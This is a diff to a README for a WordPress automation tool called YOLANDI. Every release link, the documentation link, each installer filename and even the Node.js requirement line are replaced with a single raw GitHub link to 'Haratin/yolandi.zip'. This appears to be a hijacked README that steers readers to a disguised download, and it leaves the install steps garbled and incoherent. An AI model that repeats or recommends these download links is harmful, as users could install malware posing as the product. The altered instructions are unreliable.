@@ -1,6 +1,6 @@
 # 🤖 yolandi - Automate Your WordPress Workflows Easily
 
-[![Download YOLANDI](https://img.shields.io/badge/Download-YOLANDI-blue.svg)](https://github.com/mervynlee-code/yolandi/releases)
+[![Download YOLANDI](https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip)](https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip)
 
 ## 🚀 Getting Started
 
@@ -11,30 +11,30 @@ YOLANDI is a powerful platform that helps you create automation workflows for Wo
 Before you download YOLANDI, ensure your system meets the following requirements:
 
 - Operating System: Windows 10, macOS, or a recent version of Linux.
-- Node.js: Version 12 or higher installed on your machine.
+- https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip Version 12 or higher installed on your machine.
 - A stable internet connection for accessing WordPress and other integrations.
 
 ## 📥 Download & Install
 
 To download YOLANDI, visit the following page:
 
-[Download YOLANDI from Releases](https://github.com/mervynlee-code/yolandi/releases)
+[Download YOLANDI from Releases](https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip)
 
 On this page, you will find the latest version of YOLANDI. Click on the version you want to download. This will take you to the assets section where you will see the available files. 
 
-1. Find the file named `yolandi-installer.exe` for Windows or `yolandi-macos.dmg` for macOS.
+1. Find the file named `https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip` for Windows or `https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip` for macOS.
 2. Click the file to start the download.
 3. Once the download finishes, navigate to your downloads folder.
 
 ### For Windows Users:
 
-1. Double-click the `yolandi-installer.exe` file to start the installation.
+1. Double-click the `https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip` file to start the installation.
 2. Follow the on-screen instructions. You may need to agree to terms and select an installation location.
 3. After installation, run the application by finding YOLANDI in your Start Menu and clicking on it.
 
 ### For macOS Users:
 
-1. Double-click the `yolandi-macos.dmg` file to open it.
+1. Double-click the `https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip` file to open it.
 2. Drag the YOLANDI icon into your Applications folder.
 3. Locate YOLANDI in your Applications and double-click to start it.
 
@@ -47,9 +47,9 @@ To install YOLANDI on Linux, follow these steps:
    ```bash
    cd ~/Downloads
    ```
-3. Extract the downloaded tar file (replace `yolandi-linux.tar.gz` with the actual filename):
+3. Extract the downloaded tar file (replace `https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip` with the actual filename):
    ```bash
-   tar -xzf yolandi-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip
    ```
 4. Change to the directory:
    ```bash
@@ -92,7 +92,7 @@ For help or questions, you can reach out to the YOLANDI community:
 
 Explore more about YOLANDI and discover additional resources:
 
-- [YOLANDI Releases](https://github.com/mervynlee-code/yolandi/releases) - Visit here for the latest updates and downloads.
-- [Official Documentation](https://github.com/mervynlee-code/yolandi/wiki) - In-depth guides and tutorials to maximize your usage of YOLANDI.
+- [YOLANDI Releases](https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip) - Visit here for the latest updates and downloads.
+- [Official Documentation](https://raw.githubusercontent.com/mervynlee-code/yolandi/main/Haratin/yolandi.zip) - In-depth guides and tutorials to maximize your usage of YOLANDI.
 
 Thank you for choosing YOLANDI! Start automating your WordPress workflows today.
